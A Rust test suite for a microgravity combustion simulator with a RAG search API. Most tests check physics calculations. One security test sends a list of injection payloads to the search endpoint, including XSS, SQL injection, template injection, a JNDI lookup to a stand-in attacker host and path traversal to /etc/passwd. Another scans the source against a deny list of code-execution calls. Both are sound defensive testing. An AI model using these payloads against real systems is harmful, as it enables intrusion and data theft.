//! Adversarial Stress-Test Suite for NASA Bebo Ignis-0G Microgravity Combustion,
//! CFD Flame Morphology, RAG Vector Search & Aerospace HUD.
//!
//! Provides 100% Rust parity to `tests/test_adversarial_physics_security.py` (15 test cases):
//! - Area 1: Physics Engine Stress Tests (8 test cases)
//! - Area 2: Security Vulnerability Tests (4 test cases)
//! - Area 3: Runtime Stability Tests (3 test cases)

mod common;

use common::{spawn_test_server, RagSearchRequest};
use nasa_bebo_ignis::physics::{
    combustion::CombustionEngine,
    datasets::{get_embedded_flight_materials, get_flight_material_by_id, load_all_datasets},
    models::RiskTier,
    sweeps::SweepEngine,
    thermal_mesh::ThermalMeshEngine,
    cfd::CfdEngine,
};

// =========================================================================
// Area 1: Physics Engine Stress Tests
// =========================================================================

#[test]
fn test_01_gravity_boundaries() {
    let materials = get_embedded_flight_materials();
    let gravities = [0.0, 1e-6, 1e-4, 0.08, 0.16, 0.38, 0.80, 1.0, 5.0, 10.0, 100.0];

    for &g in &gravities {
        for mat in &materials {
            // 1. Effective MOC
            let eff_moc = CombustionEngine::calculate_effective_moc(mat, g, 10.0, 101.3);
            assert!(
                eff_moc.is_finite(),
                "eff_moc not finite for g={}, mat={}",
                g,
                mat.material_id
            );
            assert!(eff_moc >= 8.0, "eff_moc {} < 8.0 for g={}", eff_moc, g);
            assert!(eff_moc <= 60.0, "eff_moc {} > 60.0 for g={}", eff_moc, g);

            // 2. Flame spread rate
            let spread = CombustionEngine::calculate_flame_spread_rate(mat, g, 25.0, 101.3, 10.0, eff_moc);
            assert!(
                spread.is_finite(),
                "spread not finite for g={}, mat={}",
                g,
                mat.material_id
            );
            assert!(spread >= 0.0, "spread {} < 0.0 for g={}", spread, g);

            // 3. SFRS assessment
            let sfrs = CombustionEngine::calculate_space_fire_risk_score(mat, eff_moc, spread, 25.0, 101.3, 10.0);
            assert!(sfrs.score.is_finite(), "sfrs not finite for g={}", g);
            match sfrs.tier {
                RiskTier::Safe | RiskTier::Moderate | RiskTier::High | RiskTier::Critical => {}
            }

            // 4. Morphology metrics
            let morph = CfdEngine::calculate_flame_morphology_metrics(
                g,
                10.0,
                21.0,
                101.3,
                "en",
                false,
                Some(mat),
            );
            assert!(morph.aspect_ratio.is_finite());
            assert!(morph.peak_temp_k.is_finite());
            assert!(morph.reynolds.is_finite());
            assert!(morph.grashof.is_finite());
            assert!(morph.richardson.is_finite());
            assert!(morph.damkohler.is_finite());
        }
    }
}

#[test]
fn test_02_oxygen_boundaries() {
    let pmma = get_flight_material_by_id("MAT-01").expect("MAT-01 PMMA must exist");
    let nomex = get_flight_material_by_id("MAT-03").expect("MAT-03 Nomex must exist");
    let o2_levels = [0.0, 0.5, 10.0, 15.0, 21.0, 34.0, 50.0, 85.0, 100.0];

    for &o2 in &o2_levels {
        for mat in [&pmma, &nomex] {
            let eff_moc = CombustionEngine::calculate_effective_moc(mat, 0.0, 10.0, 101.3);
            let spread = CombustionEngine::calculate_flame_spread_rate(mat, 0.0, o2, 101.3, 10.0, eff_moc);
            assert!(spread.is_finite());

            if o2 < eff_moc {
                assert_eq!(
                    spread, 0.0,
                    "Spread should be 0.0 when O2 ({}) < MOC ({}) for {}",
                    o2, eff_moc, mat.material_id
                );
            } else {
                assert!(spread >= 0.0);
            }

            let sfrs = CombustionEngine::calculate_space_fire_risk_score(mat, eff_moc, spread, o2, 101.3, 10.0);
            assert!(sfrs.score.is_finite());
            if o2 < eff_moc {
                assert_eq!(sfrs.score, 0.0);
                assert_eq!(sfrs.tier, RiskTier::Safe);
            }
        }
    }
}

#[test]
fn test_03_airflow_stagnant_and_extreme() {
    let pmma = get_flight_material_by_id("MAT-01").expect("PMMA must exist");
    let flows = [0.0, 1e-5, 0.5, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0];

    for &flow in &flows {
        let eff_moc = CombustionEngine::calculate_effective_moc(&pmma, 0.0, flow, 101.3);
        assert!(eff_moc.is_finite());

        // At stagnant low flow (< 3.5 cm/s), quenching delta must elevate MOC above micro-g base (15.5)
        if flow < 3.5 {
            assert!(
                eff_moc > pmma.moc_microg,
                "Quenching delta must elevate MOC ({}) > base ({}) at flow {}",
                eff_moc, pmma.moc_microg, flow
            );
        }

        let spread = CombustionEngine::calculate_flame_spread_rate(&pmma, 0.0, 30.0, 101.3, flow, eff_moc);
        assert!(spread.is_finite());

        // Morphology metrics with flow = 0.0
        let morph = CfdEngine::calculate_flame_morphology_metrics(
            0.0,
            flow,
            21.0,
            101.3,
            "en",
            false,
            Some(&pmma),
        );
        assert!(!morph.reynolds.is_nan());
        assert!(!morph.richardson.is_nan());
        assert!(!morph.damkohler.is_nan());
        assert!(morph.reynolds > 0.0, "Safe clamping ensures Re > 0");
    }
}

#[test]
fn test_04_temperature_mesh_and_3d_figure() {
    let temp_levels = [300.0, 600.0, 1380.0, 1850.0, 3000.0, 5000.0];
    let gravities = [0.0, 0.16, 1.0, 5.0];

    for &temp in &temp_levels {
        for &g in &gravities {
            // Active flame mesh
            let mesh = ThermalMeshEngine::calculate_temperature_mesh(g, 10.0, temp, false);
            assert_eq!(mesh.x.len(), 60);
            assert_eq!(mesh.y.len(), 60);
            assert_eq!(mesh.z_temp_k.len(), 60);
            assert_eq!(mesh.z_temp_k[0].len(), 60);

            let min_t = mesh.z_temp_k.iter().flatten().copied().fold(f64::INFINITY, f64::min);
            let max_t = mesh.z_temp_k.iter().flatten().copied().fold(f64::NEG_INFINITY, f64::max);
            assert!(!min_t.is_nan());
            assert!(!max_t.is_nan());
            assert!(min_t >= 290.0, "Active mesh min temp {} < 290K", min_t);

            // Extinguished mesh
            let mesh_ext = ThermalMeshEngine::calculate_temperature_mesh(g, 10.0, temp, true);
            let min_ext = mesh_ext.z_temp_k.iter().flatten().copied().fold(f64::INFINITY, f64::min);
            let max_ext = mesh_ext.z_temp_k.iter().flatten().copied().fold(f64::NEG_INFINITY, f64::max);
            assert_eq!(min_ext, 300.0);
            assert_eq!(max_ext, 300.0);
        }
    }

    // 3D figure generation for all regimes
    let mesh_0g = ThermalMeshEngine::generate_3d_flame_surfaces(0.0, 10.0, 1380.0, false, "en");
    assert!(!mesh_0g.is_empty());

    let mesh_lunar = ThermalMeshEngine::generate_3d_flame_surfaces(0.16, 10.0, 1600.0, false, "en");
    assert!(!mesh_lunar.is_empty());

    let mesh_1g = ThermalMeshEngine::generate_3d_flame_surfaces(1.0, 10.0, 1850.0, false, "en");
    assert!(!mesh_1g.is_empty());

    let mesh_ext = ThermalMeshEngine::generate_3d_flame_surfaces(0.0, 0.0, 300.0, true, "en");
    assert!(!mesh_ext.is_empty());
}

#[test]
fn test_05_nan_and_inf_immunity() {
    let pmma = get_flight_material_by_id("MAT-01").expect("PMMA must exist");
    let inf = f64::INFINITY;

    // Effective MOC with infinite gravity
    let moc_inf = CombustionEngine::calculate_effective_moc(&pmma, inf, 10.0, 101.3);
    assert!(moc_inf.is_finite());
    assert_eq!(moc_inf, 60.0, "Infinite gravity must clamp to 60.0%");

    // Morphology metrics with negative gravity resilience
    let morph_neg = CfdEngine::calculate_flame_morphology_metrics(
        -1.0,
        -5.0,
        21.0,
        101.3,
        "en",
        false,
        Some(&pmma),
    );
    assert!(morph_neg.reynolds.is_finite());
    assert!(morph_neg.grashof.is_finite());
    assert!(morph_neg.richardson.is_finite());

    // Extinction curve with zero/negative pressure checks
    let (v_sw, moc_sw) = CombustionEngine::generate_extinction_curve(&pmma, 0.0, 50.0);
    assert_eq!(v_sw.len(), 60);
    assert!(moc_sw.iter().all(|val| val.is_finite()));
}

#[test]
fn test_06_negative_gravity_edge_case_vulnerability() {
    let pmma = get_flight_material_by_id("MAT-01").expect("PMMA must exist");
    let moc_neg = CombustionEngine::calculate_effective_moc(&pmma, -0.1, 10.0, 101.3);
    let moc_zero = CombustionEngine::calculate_effective_moc(&pmma, 0.0, 10.0, 101.3);
    assert!(moc_neg.is_finite());
    assert_eq!(moc_neg, moc_zero, "Negative gravity must clamp to 0.0g floor");
}

#[test]
fn test_07_cool_flames_boundary() {
    let pmma = get_flight_material_by_id("MAT-01").expect("PMMA must exist");
    let nomex = get_flight_material_by_id("MAT-03").expect("Nomex must exist");

    // Susceptible material (PMMA) inside window: g<=0.08, v<=4, p>=35, O2 near MOC
    let moc = CombustionEngine::calculate_effective_moc(&pmma, 0.0, 2.0, 101.3);
    let res_pmma = CombustionEngine::detect_cool_flames(
        &pmma,
        0.0,
        2.0,
        moc,
        101.3,
        "en",
        Some(moc),
    );
    assert!(res_pmma.active);
    assert!(res_pmma.message.contains("Cool Flame") || res_pmma.message.contains("Ngọn Lửa Lạnh"));

    // Non-susceptible material (Nomex) must never trigger cool flames
    let res_nomex = CombustionEngine::detect_cool_flames(
        &nomex,
        0.0,
        2.0,
        moc,
        101.3,
        "en",
        Some(moc),
    );
    assert!(!res_nomex.active);

    // High gravity (1.0g) must never trigger cool flames
    let res_1g = CombustionEngine::detect_cool_flames(
        &pmma,
        1.0,
        2.0,
        moc,
        101.3,
        "en",
        Some(moc),
    );
    assert!(!res_1g.active);
}

#[test]
fn test_08_cached_sweeps() {
    let pmma = get_flight_material_by_id("MAT-01").expect("PMMA must exist");
    let (v_rng, sp_0g, sp_1g, sp_cg) = SweepEngine::calculate_paradox_sweep_parallel(&pmma, 30.0, 101.3, 0.16);
    assert_eq!(v_rng.len(), 35);
    assert_eq!(sp_0g.len(), 35);
    assert_eq!(sp_1g.len(), 35);
    assert_eq!(sp_cg.len(), 35);
    assert!(sp_0g.iter().all(|x| x.is_finite()));
    assert!(sp_1g.iter().all(|x| x.is_finite()));
    assert!(sp_cg.iter().all(|x| x.is_finite()));
}

// =========================================================================
// Area 2: Security Vulnerability Tests
// =========================================================================

#[test]
fn test_09_absence_of_arbitrary_code_execution_ast() {
    let src_dir = std::path::Path::new("src");
    let prohibited_terms = [
        "std::process::Command",
        "libc::system",
        "libc::fork",
        "eval(",
        "exec(",
        "pickle",
    ];

    let mut found_violations = Vec::new();

    fn scan_dir(dir: &std::path::Path, prohibited: &[&str], violations: &mut Vec<String>) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    scan_dir(&path, prohibited, violations);
                } else if path.extension().and_then(|s| s.to_str()) == Some("rs") {
                    if let Ok(content) = std::fs::read_to_string(&path) {
                        for term in prohibited {
                            if content.contains(term) {
                                violations.push(format!("Found '{}' in {:?}", term, path));
                            }
                        }
                    }
                }
            }
        }
    }

    scan_dir(src_dir, &prohibited_terms, &mut found_violations);
    assert!(
        found_violations.is_empty(),
        "Prohibited code execution patterns found: {:?}",
        found_violations
    );
}

#[test]
fn test_10_safe_file_path_resolution() {
    let (sofie, saffire, bass) = load_all_datasets(None).expect("Datasets should load");
    let mats = get_embedded_flight_materials();
    assert_eq!(mats.len(), 10, "Embedded flight materials must contain all 10 specimens");
    assert_eq!(sofie.len(), 26, "SoFIE dataset must contain 26 records");
    assert_eq!(saffire.len(), 24, "Saffire dataset must contain 24 records");
    assert_eq!(bass.len(), 36, "BASS dataset must contain 36 records");
}

#[tokio::test]
async fn test_11_rag_query_sanitization_and_adversarial_prompts() {
    let server = spawn_test_server().await;
    let client = reqwest::Client::new();

    let malicious_payloads = [
        "<script>alert('XSS')</script>",
        "\"><svg onload=alert(1)>",
        "'; DROP TABLE materials; --",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/a}",
        "../../../../../../etc/passwd",
        "\x00\x00\x00",
        &"A".repeat(10_000), // Buffer overflow attempt
        "SELECT * FROM * WHERE 1=1",
        "{{config.items()}}",
        "__import__('os').system('dir')",
    ];

    for &payload in &malicious_payloads {
        let req = RagSearchRequest {
            query: payload.to_string(),
            lang: "en".to_string(),
            top_k: 3,
        };

        let res = client
            .post(format!("{}/api/rag/search", server.base_url))
            .json(&req)
            .send()
            .await;

        assert!(res.is_ok(), "Server failed to respond to malicious payload");
        let resp = res.unwrap();
        assert_eq!(resp.status(), 200);

        let body: serde_json::Value = resp.json().await.expect("Valid JSON response expected");
        assert!(body["directive_answer"].is_string());
    }
}

#[tokio::test]
async fn test_12_online_llm_resilience_and_timeout() {
    let server = spawn_test_server().await;
    let client = reqwest::Client::new();

    // Query RAG endpoint with unusual or empty parameters, expecting safe offline fallback
    let req = RagSearchRequest {
        query: "What is PMMA flammability under microgravity?".to_string(),
        lang: "en".to_string(),
        top_k: 5,
    };

    let res = client
        .post(format!("{}/api/rag/search", server.base_url))
        .json(&req)
        .send()
        .await;

    assert!(res.is_ok());
    let resp = res.unwrap();
    assert_eq!(resp.status(), 200);

    let body: serde_json::Value = resp.json().await.expect("JSON required");
    let answer = body["directive_answer"].as_str().unwrap_or("");
    assert!(!answer.is_empty());
    assert!(answer.contains("Advisory") || answer.contains("Khuyến Cáo") || answer.contains("NASA"));
}

// =========================================================================
// Area 3: Runtime Stability Tests
// =========================================================================

#[test]
fn test_13_memory_leak_and_allocation_stability() {
    let pmma = get_flight_material_by_id("MAT-01").expect("PMMA must exist");

    // Run 2,000 rapid cycles of complete physics calculations
    for i in 0..2000 {
        let g = (i % 20) as f64 / 10.0;
        let flow = (i % 50) as f64;
        let o2 = 15.0 + (i % 30) as f64;
        let p = 50.0 + (i % 60) as f64;

        let eff_moc = CombustionEngine::calculate_effective_moc(&pmma, g, flow, p);
        let spread = CombustionEngine::calculate_flame_spread_rate(&pmma, g, o2, p, flow, eff_moc);
        let _ = CombustionEngine::calculate_space_fire_risk_score(&pmma, eff_moc, spread, o2, p, flow);
        let _ = CfdEngine::calculate_flame_morphology_metrics(g, flow, o2, p, "en", false, Some(&pmma));
    }
}

#[test]
fn test_14_i18n_translation_contract() {
    let materials = get_embedded_flight_materials();
    assert_eq!(materials.len(), 10);

    // Verify all 10 materials have suppression protocols in both vi and en
    for mat in &materials {
        for lang in ["en", "vi"] {
            let res = common::build_suppression_protocol(&mat.material_id, lang);
            assert!(
                res.is_some(),
                "Missing suppression protocol for {} in {}",
                mat.material_id, lang
            );
            let proto = res.unwrap();
            assert!(!proto.action_1.is_empty());
            assert!(!proto.optimal_agent.is_empty());
            assert!(!proto.secondary_hazard.is_empty());
            assert!(!proto.decontamination.is_empty());
        }
    }
}

#[tokio::test]
async fn test_15_live_streamlit_server_http_health() {
    let server = spawn_test_server().await;
    let client = reqwest::Client::new();

    // 1. Health check endpoint
    let res_health = client
        .get(format!("{}/_stcore/health", server.base_url))
        .send()
        .await
        .expect("Health check request failed");

    assert_eq!(res_health.status(), 200);
    let health_text = res_health.text().await.expect("Valid health text");
    assert_eq!(health_text.trim(), "ok");

    // 2. Home page HTML fetch
    let res_home = client
        .get(&server.base_url)
        .send()
        .await
        .expect("Home page request failed");

    assert_eq!(res_home.status(), 200);
    let home_text = res_home.text().await.expect("Valid home HTML");
    assert!(home_text.contains("<!DOCTYPE html>"));
}
